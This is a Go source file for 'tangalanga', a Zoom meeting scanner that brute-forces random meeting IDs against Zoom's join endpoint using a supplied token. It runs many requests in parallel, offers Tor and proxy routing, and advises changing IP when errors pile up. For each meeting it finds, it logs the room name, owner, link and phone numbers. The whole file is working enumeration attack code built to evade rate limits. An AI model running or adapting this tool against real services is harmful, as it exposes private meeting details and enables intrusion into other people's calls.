package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/logrusorgru/aurora"
	log "github.com/sirupsen/logrus"
)

const logo = `

		zoom scanner

▄▄▄▄▄ ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄· ▄▄▌   ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄·
•██  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█ ██•  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█
 ▐█.▪▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█ ██▪  ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█
 ▐█▌·▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▌▐▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌
 ▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀ .▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀

		made with 💀 by @cuerbot

`

const zoomUrl = "https://www3.zoom.us/conf/j"

var colorFlag = flag.Bool("colors", true, "enable or disable colors")
var token = flag.String("token", "", "zpk token to use")
var debugFlag = flag.Bool("debug", false, "show error messages")
var outputFile = flag.String("output", "", "output file for successful finds")
var torFlag = flag.Bool("tor", false, "connect via tor")
var proxyAddr = flag.String("proxy", "socks5://127.0.0.1:9150", "socks url to use as proxy")
var hiddenFlag = flag.Bool("hidden", false, "connect via embedded tor")
var rateCount = flag.Int("rate", runtime.NumCPU()/2, "connect via embedded tor")

var color aurora.Aurora
var tangalanga *Tangalanga
var wg sync.WaitGroup
var ids chan int

func init() {
	var t *http.Transport
	ids = make(chan int)

	rand.Seed(time.Now().UnixNano())
	color = aurora.NewAurora(*colorFlag)

	flag.Parse()

	fmt.Println(color.Green(logo))

	if *token == "" {
		log.Panic("Missing token")
	}

	if *outputFile != "" {
		file, err := os.OpenFile(*outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)

		if err != nil {
			log.SetOutput(os.Stdout)
		} else {
			fmt.Printf("output is %s\n", color.Yellow(*outputFile))
			log.SetOutput(file)
		}
	}

	fmt.Printf("worker pool size %d\n", color.Yellow(*rateCount))

	transports := new(Transport)

	switch true {
	case *hiddenFlag:
		fmt.Printf("connecting to the TOR network... %s\n", color.Yellow("please wait"))
		t = transports.InteralTOR()

	case *torFlag:
		fmt.Printf("connecting to the TOR network via proxy %s...\n", color.Yellow(*proxyAddr))
		t = transports.Proxy(*proxyAddr)

	default:
		t = transports.Default()
	}

	tangalanga, _ = NewTangalanga(
		WithTransport(t),
	)

}

func randId() int {
	min := 60000000000 // Just to avoid a sea of non existent ids
	max := 99999999999

	return rand.Intn(max-min+1) + min
}

func find(id int) {
	m, err := tangalanga.FindMeeting(id)

	if err != nil && *debugFlag {
		fmt.Printf("%s\n", err)
	}

	if tangalanga.ErrorCounter >= 100 {
		fmt.Println(color.Red("too many errors!! try changing ip"))
	}

	if err == nil {
		r := m.GetRoom()
		roomId, roomName, user, link := r.GetRoomId(), r.GetRoomName(), r.GetUser(), r.GetLink()

		msg := "\nRoom ID: %d.\n" +
			"Room: %s.\n" +
			"Owner: %s.\n" +
			"Link: %s\n\n"

		fmt.Printf(msg,
			color.Green(roomId),
			color.Green(roomName),
			color.Green(user),
			color.Yellow(link),
		)

		log.WithFields(log.Fields{
			"room_id":   roomId,
			"room_name": roomName,
			"owner":     user,
			"link":      link,
		}).Info(r.GetPhoneNumbers())
	}

}

func pool() {
	for i := 0; i < *rateCount; i++ {
		wg.Add(1)

		go func() {
			for id := range ids {
				find(id)
			}

			wg.Done()
		}()
	}
}

func main() {
	c := make(chan os.Signal, 2)

	fmt.Printf("finding disclosed room ids... %s\n", color.Yellow("please wait"))

	go func() {
		<-c
		tangalanga.Close()
		os.Exit(0)
	}()

	go pool()

	for h := 0; ; h++ {
		for i := 0; i < *rateCount; i++ {
			ids <- randId()
		}

		wg.Wait()

		if h%200 == 0 && h > 0 {
			fmt.Printf("%d ids processed\n", color.Red(h)) // Just to show something if no debug
		}
	}

	<-c
}
